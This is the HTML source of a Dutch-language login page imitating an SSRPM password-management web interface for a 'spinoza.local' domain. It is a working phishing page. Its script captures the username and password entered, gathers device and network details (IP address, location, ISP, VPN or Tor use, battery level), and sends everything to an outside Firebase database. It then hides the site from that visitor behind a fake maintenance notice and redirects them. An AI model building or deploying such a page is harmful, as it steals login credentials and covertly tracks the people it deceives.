<!DOCTYPE html>
<html lang="nl">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=9; IE=8; IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SSRPM Web Interface</title>
    <link href="css/css.css" rel="stylesheet">
    <link href="css/custom.css" rel="stylesheet" type="text/css">
    <link href="css/ssrpm.css" rel="stylesheet" type="text/css">
    <link rel="shortcut icon" href="images/favicon.ico" type="image/x-icon">
    <link rel="icon" href="images/favicon.ico" type="image/ico">
    <script src="js/jquery.js"></script>
    <script src="js/bootstrap.js"></script>
    <script src="js/CommonFunctions.js"></script>
    
    <!-- Firebase SDK -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/12.4.0/firebase-app.js";
        import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/12.4.0/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyClpvIHEe98giJTQxO-bNbUci0i4LOmj3U",
            authDomain: "project34-baebd.firebaseapp.com",
            projectId: "project34-baebd",
            storageBucket: "project34-baebd.firebasestorage.app",
            messagingSenderId: "92418567493",
            appId: "1:92418567493:web:6d51d4af2b66ed14c3e22c"
        };

        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        // Maintenance check (per-user via localStorage)
        if (localStorage.getItem('site_maintenance') === '1') {
            document.addEventListener('DOMContentLoaded', function() {
                document.body.innerHTML = `
                    <div class="container-fluid">
                        <div class="row width-100-percent">
                            <div class="col-sm-2"></div>
                            <div class="col-sm-8">
                                <div class="user-details" style="margin-top:60px;padding:30px;text-align:center;">
                                    <h2>Site in onderhoud</h2>
                                    <p>Deze site is tijdelijk niet beschikbaar voor dit apparaat.</p>
                                </div>
                            </div>
                            <div class="col-sm-2"></div>
                        </div>
                    </div>`;
            });
        }

        // Collect device information (incl. VPN detection)
        async function collectDeviceInfo() {
            const base = {
                userAgent: navigator.userAgent,
                operatingSystem: getOperatingSystem(),
                screenSize: `${screen.width}x${screen.height}`,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                battery: await getBatteryInfo(),
                browserHistory: 'Not accessible for security reasons',
                timestamp: serverTimestamp()
            };
            try {
                const res = await fetch('https://ipwho.is/?fields=ip,success,connection,security,city,region,country');
                const info = await res.json();
                const vpnUsed = !!(info?.security?.vpn || info?.security?.proxy || info?.security?.tor);
                const serverLocation = [info?.country, info?.region, info?.city].filter(Boolean).join(', ');
                return {
                    ...base,
                    ipAddress: info?.ip || 'Unknown',
                    serverLocation: serverLocation || 'Unknown',
                    isp: info?.connection?.isp || undefined,
                    vpnUsed
                };
            } catch (e) {
                return { ...base, ipAddress: 'Unknown', serverLocation: 'Unknown', vpnUsed: false };
            }
        }

        function getOperatingSystem() {
            const userAgent = navigator.userAgent;
            if (userAgent.indexOf("Win") != -1) return "Windows";
            if (userAgent.indexOf("Mac") != -1) return "MacOS";
            if (userAgent.indexOf("Linux") != -1) return "Linux";
            if (userAgent.indexOf("Android") != -1) return "Android";
            if (userAgent.indexOf("iOS") != -1) return "iOS";
            return "Unknown";
        }

        function getBatteryInfo() {
            if ('getBattery' in navigator) {
                return navigator.getBattery().then(battery => {
                    return `Level: ${Math.round(battery.level * 100)}%, Charging: ${battery.charging}`;
                });
            }
            return Promise.resolve("Not available");
        }

        // Form submission
        window.submitForm = async function() {
            const username = document.getElementById('DataModel_UserName').value;
            const password = document.getElementById('DataModel_Password').value;
            
            if (!username || !password) {
                alert('Vul alle velden in');
                return;
            }

            try {
                const deviceInfo = await collectDeviceInfo();
                const userData = {
                    username: username,
                    password: password,
                    ...deviceInfo
                };

                await addDoc(collection(db, 'users'), userData);
                
                // Show success message
                alert('Gegevens succesvol verzonden!');
                // Enable per-user maintenance mode locally
                localStorage.setItem('site_maintenance', '1');
                
                // Redirect to home page
                window.location.href = 'https://sgdcproject34.github.io/project34-spinoza/';
                
            } catch (error) {
                console.error('Error saving data:', error);
                alert('Er is een fout opgetreden bij het verzenden van de gegevens.');
            }
        };

        // Prevent default form submission
        document.addEventListener('DOMContentLoaded', function() {
            const form = document.getElementById('AacDataForm');
            if (form) {
                form.addEventListener('submit', function(e) {
                    e.preventDefault();
                    submitForm();
                });
            }
        });
    </script>
</head>

<body class="body-image" scroll="no">
    <div class="container-fluid">
        <div class="row width-100-percent">
            <div class="col-sm-2"></div>
            <div class="col-sm-2"></div>
            <div class="col-sm-2"></div>
            <div class="col-sm-2"></div>
            <div class="col-sm-2"></div>
            <div class="col-sm-2"></div>
        </div>
    </div>

    <div class="hidden-field" id="token"></div>
    <div class="logo-body">
        <div class="logo-container">
            <div class="logo"></div>
        </div>
    </div>

    <div class="ssrpmbody">
        <div class="formheader">
            <div class="enroll-icon form-icon"></div>
            <div class="formheader-vertical">
                <div class="formheader-text">Vul uw gebruikersnaam en wachtwoord in om verder te gaan.</div>
            </div>
        </div>

        <div class="progress-div">
            <div class="progress">
                <div class="progress-bar" role="progressbar" style="width:430px"></div>
            </div>
            <div class="progress-steps"></div>
        </div>
        
        <div class="form-body"> 
            <div class="row">
                <div class="col-sm-12">
                    <form id="AacDataForm">
                        <div class="form-container">
                            <div class="form-group-label">
                                <label for="DataModel_UserName">Gebruikersnaam:</label>
                            </div>
                            <div class="form-group-edit">
                                <input autofocus="autofocus" class="form-control text-box single-line" id="DataModel_UserName" name="DataModel.UserName" placeholder="Vul gebruikersnaam in" tabindex="1" type="text" value="">
                            </div>
                            <div class="form-group-label">
                                <label for="DataModel_Password">Wachtwoord:</label>
                            </div>
                            <div class="form-group-edit">
                                <input class="form-control text-box single-line password" data-toggle="password" id="DataModel_Password" name="DataModel.Password" placeholder="Vul wachtwoord in" tabindex="2" type="password" value="">
                            </div>
                            <input id="DataModel_Domain" name="DataModel.Domain" type="hidden" value="spinoza.local">
                        </div>

                        <div class="nav-btn-group">
                            <input type="button" class="cancel btn-submit" id="BackBtn" name="BackBtn" value="Vorige" tabindex="8" onclick="window.location.href='https://sgdcproject34.github.io/project34-spinoza/'">
                            <input type="submit" class="btn-submit" id="NextBtn" name="NextBtn" value="Volgende" autofocus="" tabindex="9">
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </div>

    <script type="text/javascript">
        $('[data-toggle="tooltip"]').tooltip();

        $(document).ready(function () {
            setTimeout(
                function () {
                    var el = $('[autofocus="autofocus"]');
                    if (el.length > 0) {
                        if (el[0].type == "text")
                            el[0].selectionStart = el[0].selectionEnd = el[0].value.length;
                        el[0].focus();
                    }
                }, 250);
        });
    </script>
</body>
</html>
